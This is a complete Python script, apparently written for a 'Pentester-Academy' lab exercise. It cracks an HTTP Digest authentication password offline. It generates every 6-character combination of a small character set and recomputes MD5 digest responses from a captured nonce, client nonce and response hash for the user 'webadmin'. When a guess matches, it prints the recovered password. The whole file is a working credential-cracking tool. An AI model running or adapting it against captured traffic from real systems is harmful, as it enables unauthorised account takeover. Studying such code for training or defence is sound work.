__author__ = 'lucif3r'

import itertools
import hashlib


def generate_wordlist(words, l):
    """
    :rtype : list
    :param words The string from which words should be made:
    :param l length of the strings:
    :return:
    """
    list_pass = []
    for i in itertools.product(words, repeat=l):
        list_pass.append("".join(i))
    return list_pass


def brute_force(username):
    response = '0fd7c603fdf61e89bfc9c95fb73e343a'
    uri = '/'
    Realm = 'Pentester-Academy'
    passwords = generate_wordlist('x12yz3', 6)
    nonce = 'X95LDujmBAA=9c8ec8a0aeee0ddf7f24a5a75c57d0f90245d0f5'
    nonce_count = '00000001'
    client_nonce = '89b024ea3adb54ec'
    qop = 'auth'
    for i in passwords:
        print(i)
        hash1_string = (username + ':' + Realm + ':' + i).encode('utf-8')
        hash2_string = ('GET:' + uri).encode('utf-8')

        hash1 = hashlib.md5(hash1_string).hexdigest()
        hash2 = hashlib.md5(hash2_string).hexdigest()
        re_string = (hash1 + ':' + nonce + ':' + nonce_count + ':' + client_nonce + ':' + qop + ':' + hash2).encode(
            'utf-8')

        response_new = hashlib.md5(re_string).hexdigest()
        if response == response_new:
            print("Username: " + username, "Password: " + i)
            break


brute_force('webadmin')